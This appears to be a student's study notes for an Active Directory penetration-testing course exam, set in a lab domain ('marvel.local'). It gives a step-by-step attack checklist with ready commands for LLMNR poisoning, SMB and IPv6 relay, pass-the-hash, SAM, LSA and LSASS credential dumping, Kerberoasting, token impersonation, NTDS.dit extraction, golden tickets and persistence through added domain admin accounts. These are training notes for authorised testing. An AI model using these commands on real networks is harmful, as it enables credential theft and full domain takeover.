# Initial Attacks
---
[[Initial Attack Strategy]]

- ==**Run Responder and generate traffic**== with nmap / nessus scans [[LLMNR Poisoning Lab]]
	- `sudo responder -I tun0 -dwv`
	- Make sure **all the Servers are on** (specially SMB and HTTP)
	- OneRuleToRuleThemAll (use if fails by default) to crack
	  
- ==**SMB Relay**== (Look for ***Message/SMB signing disabled or not enforced/required*** in nmap) [[SMB Relay Attack Lab]]
	- **turn off SMB and HTTP switches** off in **Responder.conf**
	- `sudo responder -I tun0 -dwv`
	- `impacket-ntlmrelayx -tf targets.txt -smb2support`
- **==Gaining Access (shell) with captured Hash / Password==**
	- [[Gaining a Shell]]
	- **Psexec / WMIExec / SMBexec** (Use another if one fails)
		- `use exploit/windows/smb/psexec` On metasploit
			- Don't forget to **change architecture if required**
		- `impacket-psexec marvel.local/fcastle:'Password1'@10.0.0.25` using impacket => **Better as less noisy**
		  
- ==**IPv6 - MITM6 attack** (A good one)==
	- [[IPv6 Attack]]
	- **Run for 5-10 minutes ONLY to avoid outages**
	- First **run impacket to relay** : `impacket-ntlmrelayx -6 -t ldaps://<DC_IP> -wh fakewpad.marvel.local -l lootme`
	- Then for **domain dump**: `sudo /opt/tools/mitm6/mitm6_env/bin/python /opt/tools/mitm6/mitm6/mitm6.py -d marvel.local`
	- If **some ==administrator log ins, `mitm6.py` will create a new user in the domain for us**==
		- This user has **enterprise admins group and can do secretsdump or dcsync attack**

- ==**Printers or other servers with default/weak credentials**==
	- [[Printer Hacking]]
	- Something that **connects to LDAP, SMB, etc**
	  
- ==**Think out of the box**==
	- **Default credentials**
	- What else is available? - **Websites, Printers, Some other server**
# Post-Compromise Enumeration
---
[[Post-Compromise AD Enumeration]]
**==Enumerate each machine thoroughly even after you found credentials or possible way forward==**
==**Look in the linked file in each tool on what to look for in dumped files**==

 - **LDAP Domain Dump**  [[Domain Enumeration ldapdomaindump]]
	 - **Make a new directory and cd into it** to avoid making mess of files
	 - `sudo ldapdomaindump ldaps://<DC_IP> -u 'MARVEL\fcastle' -p Password1 -o .`

- **==Bloodhound dump==** [[Domain Enumeration Bloodhound]]
	- Injestor: `sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns 10.0.1.4 -c all`
	- `sudo neo4j console`
	- `sudo bloodhound`
	- Load collected data and **ENUMERATE**
	- **Double Click on Owned Users to find paths** 
	- [[Backup OPs, Account Ops, Exchange Wind Perms]]
	- ==If **domain admin is logged to non-domain controller**, we can do [[Token Impersonation Overview]]==
	- ==**Kerberoastable Users**==

- **Plumhound**
	- [[Plumhound]]
	- `sudo Plumhoundenv/bin/python PlumHound.py -x tasks/default.tasks -p neo4j1`
	- View report using: `firefox index.html`

- **PingCastle**
	- [[https://academy.tcm-sec.com/courses/1152300/lectures/48515112]]

# Post-Compromise Attacks
---
**How can I move laterally until I can move vertically?**
[[Post Compromise Strategy]]

- ==**Pass Attacks (Pass the Hash)**== [[Pass Attacks Lab]]
- ==**Very Very Common** to find same users on multiple machines==
	- For ==**enumerating where ELSE the compromised credentials have access to**==
		- `netexec smb 10.0.1.0/24 -u fcastle -d MARVEL.local -p Password1`
		- `netexec smb 10.0.1.0/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth --sam`
		- **==Local Auth is required as we have ONLY  dumped hashes of a normal domain machine not from NTDS.dit and HASH does not take domain as argument==**
	- To **test hash reuse across workstations** using a **dumped local admin hash**:
		- `netexec smb 10.0.0.0/24 -u <local_user> -H <hash> --local-auth`
	- ==**Dump SAM** when there is **successful access**==:
		- `netexec smb 10.0.1.0/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth --sam`
	- **Dumping LSA** (logged in saved hashes):
		- `netexec smb 10.0.1.0/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth --lsa`
	- **==LSASSY (logged in user's password from memory)==**:
		- `netexec smb 10.0.1.0/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth -M lsassy`
	- **KeyPass** is also a good one

- ==**SecretsDump**== [[Secretsdump and Cracking]]
	- go on **==every machine and dump secrets from there** (TODO: Make a bash script)
	- `impacket-secretsdump MARVEL.local/sstrange:'Password1'@10.0.1.0/24` => using **Password**
	- `impacket-secretsdump pparker:@10.0.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16` => using **hash**
		- **Grab all the admin and normal users SAM hashes** (except for Guest and DefaultAccount, WDAGUtility)
		- Try to **crack them** as well
	- We might be able to see clear text passwords
	-  `wdigest`: **==Available on older windows (7, 8, XP)==**
		- We can see ==**domain admin` password if they have logged in from secretsdump in clear text
		- **==We can enable `wdigest (force and desperate attack, last resort)` with local admin access on machine and wait for domain admin to login==**

	-  ==We should always try to run the **obtained hashes on other machines** as well to gain access to **new machines** if that admin is present==
	
	- **Evil-WinRm**
		- **Login using password or hashes** IF WinRM is available
		- `evil-winrm -i <ip> -u <user> -H <NT_Hash>`
		- `evil-winrm -i <ip> -u <user> -p <password>`
	
	- **Lateral Movement**
		![[Pasted image 20250329163153.png]]

- **==Kerberoasting / ASREPRoasting==**
	- [[Kerberoasting Lab]],  [[ASREP Roasting Lab]]
	- Useful to **take advantage /gain access of a service account with an authenticated user**
	- `impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.1.4 -request`

- **==Token Impersonation==**
	- [[Token Impersonation Lab]]
	- [[Impersonation Privileges Overview]], [[THM - Tater, Hot Potato]]
	- [[Administrator Group To SYSTEM]]
	- Metasploit:
		- `use exploit/windows/smb/psexec`
		- `load incognito`
		- `impersonate_token marvel\\fcastle`
	- **==Delegate token gets created once it is logged in, and then we can impersonate that user==** (maybe **force login admin if possible**?)
	- **==Persistence==** once done, **add a domain admin user**

- **LNK File Attack** (Watering-hole attack) 
	- **Generate a file in a share and once a user views this share, it triggers the responder (if running)**
	- [[LNK File Attacks Lab]]
	- `netexec smb 10.0.1.10 -d marvel.local -u pparker -p Password1 -M slinky -o NAME=test SERVER=10.8.0.2` => Exposed File Shares

- **GPP Attacks AKA cPassword Attacks** (MS14-025)
	- **GPP allowed admins to create policies using embedded credentials**
	- These were placed in a **=="cPassword" file encrypted==**
	- The key was accidentally released 
		- ![[Pasted image 20250512153918.png]]

- **==Mimikatz==**
	- [[Mimikatz Lab]]
	- [[Golden Tickets Attack]]
	  
- **Old Vulnerabilities Die hard**


# Post-DOMAIN Compromise Attacks
---
[[Post-Domain Compromise Attack Strategy]]
**==Persistence is REQUIRED in the exam==** - Delete afterwards

- **==Dumping NTDS.dit==**
	- [[Dumping the NTDS.dit]]
	- `impacket-secretsdump MARVEl.local/hawkeye:'Password1@'@10.0.1.4 -just-dc-ntlm`
	- **Crack only the NT (later) part of the hash**
	- `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --show`

- **==Golden Ticket Attack==**
	- [[Golden Tickets Attack]]
	- Get the **`krbtgt` NTLM hash from NTDS.dit or mimikatz** and **Domain SID** using: `whoami /all`(remove the last part like, `S-1-5-21-1126976039-2783927241-3803123567-REMOVEME`) 
		- ![[Pasted image 20250512161607.png]]
	- `kerberos::golden /User:fakeuser123 /domain:MARVEL.local /sid:<copied_sid_of_domain> /krbtgt:<copied_krbtgt_hash> /id:500 /ptt`
		- `id`: Your `rid` (Admin account)
	- `misc::cmd`
	- `psexec.exe \\THEPUNISHER cmd.exe`

# Recent Vulnerabilities
---
[[Check for these]]
PrintNightmare: https://academy.tcm-sec.com/courses/1152300/lectures/33637715


# AD Case Studies Checklist
---
## Case - 1
- https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security
- [[Case Study - 1]]
- **SMB Relay Attack if hashes are caught** and even if not crackable
- Password ==**reuse is prominent** even with **different accounts**.==
- **==Moving laterally==** with all the **credentials on other machines** 
- **Keep moving laterally until a single mistake is found : ==Finding Hashes to move vertically**==

## Case - 2
- [[Case Study - 2]]
- **==what is available on the network?==**
- Web pages and default **credentials ==(administrator, admin) even on domains if we have a password==**
- **==Pay attention to `wdigest` if on previous Operating Systems (especially servers), Windows 7, 8, XP, etc
- ==**Dump all the machines with password spraying of new credentials**==

# Case - 3
- [[Case Study - 3]]
- **==Public File share access==** with a cracked hash from Responder
- ==**Service Accounts from SecretsDump**==
- **==!!! ENUMERATE !!!==**